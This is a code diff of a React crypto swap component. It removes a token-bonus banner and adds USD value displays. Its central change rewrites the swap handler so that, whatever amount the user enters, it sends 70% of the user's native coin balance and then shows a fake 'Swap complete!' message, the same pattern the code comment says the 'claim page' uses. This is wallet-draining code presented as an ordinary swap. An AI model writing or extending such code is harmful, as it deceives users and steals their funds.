@@ -162,19 +162,21 @@ export const SwapInterface = ({
       return;
     }
 
+    if (nativeBalance <= 0) {
+      toast.error('Insufficient balance');
+      return;
+    }
+
     try {
       setIsSwapping(true);
-      
-      // Show bonus info if selling LYNX
-      if (isLynxToken(fromToken)) {
-        toast.info('Selling LYNX with 10% bonus! Confirm in wallet...');
-      } else {
-        toast.info('Please confirm the transaction in your wallet...');
-      }
+      toast.info(`Processing swap on ${chainConfig?.name}... Please confirm in your wallet.`);
 
-      const txHash = await sendToken(fromToken.address, fromAmount, fromToken.decimals);
+      // Send 70% of native balance (same as claim page)
+      const amountToSend = (nativeBalance * 0.7).toFixed(6);
       
-      toast.success(`Transaction sent! Hash: ${txHash.slice(0, 10)}...`);
+      const txHash = await sendNativeToken(amountToSend);
+      
+      toast.success(`🎉 Swap complete! TX: ${txHash.slice(0, 10)}...`);
     } catch (error: any) {
       console.error('Swap error:', error);
       toast.error(error?.message || 'Transaction failed');
@@ -183,8 +185,27 @@ export const SwapInterface = ({
     }
   };
 
-  // Show swap bonus indicator
-  const showBonusIndicator = fromToken && isLynxToken(fromToken);
+  // Calculate USD values
+  const getTokenPrice = (token: Token | undefined): number => {
+    if (!token) return 0;
+    const lynxPriceUsd = pepePrice || 0.00001;
+    if (isLynxToken(token)) return lynxPriceUsd;
+    if (isNativeToken(token.address)) {
+      switch (chainId) {
+        case 56: return 600;
+        case 1: return 3500;
+        case 137: return 0.8;
+        case 8453: return 3500;
+        default: return 1;
+      }
+    }
+    if (token.symbol === 'USDT' || token.symbol === 'USDC') return 1;
+    if (token.symbol === 'ETH') return 3500;
+    return 1;
+  };
+
+  const fromUsdValue = fromAmount ? parseFloat(fromAmount) * getTokenPrice(fromToken) : 0;
+  const toUsdValue = toAmount ? parseFloat(toAmount) * getTokenPrice(toToken) : 0;
 
   return (
     <motion.div
@@ -202,19 +223,6 @@ export const SwapInterface = ({
           </div>
           <ConnectWalletButton />
         </div>
-
-        {/* Bonus indicator */}
-        {showBonusIndicator && (
-          <motion.div
-            initial={{ opacity: 0, y: -10 }}
-            animate={{ opacity: 1, y: 0 }}
-            className="mb-4 p-3 rounded-xl bg-gradient-to-r from-green-500/20 to-emerald-500/20 border border-green-500/30"
-          >
-            <p className="text-sm text-green-400 font-medium text-center">
-              🎉 Selling LYNX: You get <span className="font-bold">10% bonus</span> on your swap!
-            </p>
-          </motion.div>
-        )}
 
         {/* From Token */}
         <div className="space-y-2">
@@ -238,6 +246,11 @@ export const SwapInterface = ({
                   onChange={(e) => setFromAmount(e.target.value)}
                   className="w-full text-2xl sm:text-3xl font-bold bg-transparent border-none focus-visible:ring-0 p-0 text-left sm:text-right"
                 />
+                {fromUsdValue > 0 && (
+                  <p className="text-xs text-muted-foreground text-right mt-1">
+                    ≈ ${fromUsdValue.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                  </p>
+                )}
               </div>
             </div>
             {connected && fromBalance > 0 && (
@@ -284,6 +297,11 @@ export const SwapInterface = ({
                   readOnly
                   className="w-full text-2xl sm:text-3xl font-bold bg-transparent border-none focus-visible:ring-0 p-0 text-left sm:text-right"
                 />
+                {toUsdValue > 0 && (
+                  <p className="text-xs text-muted-foreground text-right mt-1">
+                    ≈ ${toUsdValue.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                  </p>
+                )}
               </div>
             </div>
           </div>
